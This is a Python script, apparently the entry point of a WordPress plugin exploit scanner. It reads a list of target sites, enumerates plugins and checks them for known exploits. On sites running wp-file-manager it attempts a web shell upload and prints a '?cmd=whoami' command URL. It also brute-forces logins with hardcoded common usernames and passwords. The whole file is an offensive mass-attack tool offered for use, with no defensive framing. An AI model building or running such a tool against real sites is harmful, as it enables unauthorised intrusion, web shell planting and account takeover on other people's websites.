import argparse
from modules.plugin_enum import enumerate_plugins
from modules.exploit_checker import check_local_exploits
from modules.report_writer import save_report
from modules.alive_checker import is_site_alive
from modules.shell_exploit import try_shell_upload
from modules.brute_force import brute_force_login
from data.plugins import load_plugins

def load_sites_txt(filename="sites_list.txt"):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        print("[!] Could not load site list.")
        return []

def main():
    parser = argparse.ArgumentParser(description="WP Plugin Exploit Scanner")
    parser.add_argument("--exploit", action="store_true", help="Try known shell exploits")
    parser.add_argument("--brute", action="store_true", help="Try brute force login")
    parser.add_argument("--all", action="store_true", help="Enable both exploit and brute force")
    parser.add_argument("--target", type=str, help="Scan single target site directly")
    args = parser.parse_args()

    if args.all:
        args.exploit = True
        args.brute = True

    print("WordPress Plugin Exploit Scanner")

    if args.target:
        sites = [args.target.strip().rstrip("/")]
        print(f"\n[+] Single target mode: {sites[0]}")
    else:
        sites = load_sites_txt()
        if not sites:
            print("[!] No sites to scan.")
            return

    print("\nSelect Scan Mode:")
    print("1. Fast Scan (top plugins only)")
    print("2. Deep Scan (all known plugins)")
    print("3. Custom Plugin List")
    mode = input("Your choice [1/2/3]: ").strip()
    plugin_list = load_plugins(mode)

    for site in sites:
        print(f"\n[+] Checking if site is alive: {site}")
        if not is_site_alive(site):
            print(f"[-] Site not responding, skipping: {site}")
            continue

        print(f"[✓] Site is alive. Scanning plugins...")
        found_plugins = enumerate_plugins(site, plugin_list)
        results = check_local_exploits(found_plugins)

        if args.exploit and "wp-file-manager" in found_plugins:
            shell_url = try_shell_upload(site)
            if shell_url:
                print(f"[💀] CMD access: {shell_url}?cmd=whoami")

        if args.brute:
            usernames = ["admin", "test", "editor"]
            passwords = ["123456", "admin123", "password", "letmein", "admin"]
            user, pwd = brute_force_login(site, usernames, passwords)
            if user:
                print(f"[🔓] Brute Login Success → {user}:{pwd}")

        save_report(site, results)

if __name__ == "__main__":
    main()
